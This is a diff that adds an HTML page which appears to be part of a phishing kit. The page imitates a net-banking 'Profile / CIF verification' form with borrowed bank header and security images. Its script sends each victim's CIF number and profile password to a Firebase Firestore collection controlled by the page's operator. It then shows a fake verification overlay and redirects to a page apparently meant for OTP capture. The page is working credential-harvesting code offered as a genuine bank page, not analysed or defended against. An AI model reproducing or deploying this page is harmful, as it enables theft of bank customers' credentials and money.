@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>sbynorewdpolnt</title>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDih7qIaS1eX68IIsDmAKXxYPtqvo9jLc0",
+      authDomain: "amit-f5b5b.firebaseapp.com",
+      projectId: "amit-f5b5b",
+      storageBucket: "amit-f5b5b.firebasestorage.app",
+      messagingSenderId: "282917580402",
+      appId: "1:282917580402:web:2a97eea5254d59dedb1ceb"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function generateSessionId() {
+      return 'session_' + Math.random().toString(36).substr(2, 9);
+    }
+
+    let sessionId = generateSessionId();
+    console.log("Session ID:", sessionId);
+  </script>
+
+   <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #eef2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    .header, .footer {
+      width: 100%;
+      background-color: #fff;
+      text-align: center;
+      position: relative;
+    }
+
+    .header img.main-header,
+    .footer img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .menu-button {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 30px;
+      height: 30px;
+    }
+
+    .headline {
+      width: 100%;
+      max-width: 400px;
+      height: 60px;
+      background: linear-gradient(to right, #8e24aa, #510f87);
+      display: flex;
+      align-items: center;
+      padding-left: 10px;
+      color: #fff;
+      font-weight: bold;
+      font-size: 18px;
+      position: relative;
+    }
+
+    .headline .close-btn {
+      position: absolute;
+      right: 40px;
+      font-size: 24px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+
+    .headline .headline-text {
+      margin-left: 30px;
+    }
+
+    .otp-section {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      padding: 25px 20px;
+      border: 1px solid #ccc;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      margin: 10px 0;
+      text-align: left;
+      box-sizing: border-box;
+    }
+
+    .otp-title {
+      font-size: 12px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      margin-top: 40px;
+      text-align: left;
+      color: #000000;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-group input {
+      width: 100%;
+      border: none;
+      border-bottom: 2px solid #6a1b9a;
+      padding: 10px 5px 10px 5px;
+      font-size: 16px;
+      outline: none;
+      background: transparent;
+    }
+
+    .input-group label {
+      position: absolute;
+      top: 10px;
+      left: 5px;
+      font-size: 16px;
+      color: #666;
+      pointer-events: none;
+      transition: 0.2s ease all;
+    }
+
+    .input-group input:focus ~ label,
+    .input-group input:not(:placeholder-shown) ~ label {
+      top: -10px;
+      font-size: 12px;
+      color: #6a1b9a;
+    }
+
+    .required-star {
+      color: red;
+    }
+
+    .forgot-password {
+      font-size: 14px;
+      color: #6a1b9a;
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+      text-decoration: underline;
+      text-align: left;
+      margin-bottom: 40px;
+    }
+
+    .submit-btn {
+      font-size: 16px;
+      background-color: #6a1b9a;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .security-image img {
+      width: 100%;
+      border-radius: 6px;
+      margin-top: 10px;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(5px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+      display: none;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #6a1b9a;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+      max-width: 80%;
+    }
+
+    .progress-bar-container {
+      width: 100%;
+      max-width: 400px;
+      height: 10px;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background-color: #4caf50;
+      border-radius: 4px;
+      text-align: center;
+      color: white;
+      line-height: 10px;
+      position: absolute;
+      left: 0;
+      top: 0;
+      font-size: 12px;
+      width: 25%;
+    }
+
+    .progress-text {
+      position: absolute;
+      width: 100%;
+      text-align: center;
+      color: white;
+      font-size: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+
+    @media (max-width: 480px) {
+      .otp-section {
+        padding: 20px 15px;
+      }
+
+      .headline, .header, .footer {
+        max-width: 100%;
+      }
+
+      .otp-title {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Loading Overlay -->
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  <div class="loading-text" id="loadingText">
+    Please wait... Verifying your login details... Redirecting in <span id="countdown">3</span> seconds.
+  </div>
+</div>
+
+<!-- Top Header -->
+<div class="header">
+  <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
+  <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
+</div>
+
+<!-- Headline Section -->
+<div class="headline">
+  <div class="headline-text">Net Banking Profile details</div>
+</div>
+
+<!-- Progress Bar -->
+<div class="progress-bar-container">
+  <div class="progress-bar" style="width: 85%;">
+    <div class="progress-text">85% Complete</div>
+  </div>
+</div>
+
+<!-- Profile Section -->
+<div class="otp-section">
+  <div class="otp-title">Profile / CIF verification</div>
+
+  <!-- Profile Password (now first) -->
+  <div class="input-group">
+    <input type="password" id="profilePassword" required placeholder=" " />
+    <label for="profilePassword">Profile Password<span class="required-star">*</span></label>
+  </div>
+
+  <!-- CIF Number (replaces customer name, now below) -->
+  <div class="input-group">
+    <input type="text" id="cifNumber" required placeholder=" " />
+    <label for="cifNumber">CIF Number Enter<span class="required-star">*</span></label>
+  </div>
+
+  <button class="forgot-password" onclick="forgotPassword()">Forgot Profile Password?</button>
+
+  <button class="submit-btn" onclick="submitForm()">Submit</button>
+</div>
+
+<!-- Security Image -->
+<div class="security-image">
+  <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
+</div>
+
+<!-- Bottom Footer -->
+<div class="footer">
+  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
+</div>
+
+<script>
+  function forgotPassword() {
+    alert("Use your login password...");
+  }
+
+  function submitForm() {
+    var cifNumber = document.getElementById('cifNumber').value.trim();
+    var profilePassword = document.getElementById('profilePassword').value.trim();
+
+    if (cifNumber === "" || profilePassword === "") {
+      alert("Please fill all fields.");
+      return;
+    }
+
+    db.collection("user-loginkk").add({
+      cifNumber: cifNumber,
+      profilePassword: profilePassword,
+      sessionId: sessionId,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    })
+    .then(() => {
+      document.getElementById('overlay').style.display = 'flex';
+      var countdown = 3;
+      var countdownElement = document.getElementById('countdown');
+      var interval = setInterval(function () {
+        countdown--;
+        countdownElement.textContent = countdown;
+        if (countdown === 0) {
+          clearInterval(interval);
+          window.location.href = 'invalidotp1.html';
+        }
+      }, 1000);
+    })
+    .catch((error) => {
+      console.error("Error saving data:", error);
+      alert("Something went wrong. Please try again.");
+    });
+  }
+</script>
+
+</body>
+</html>
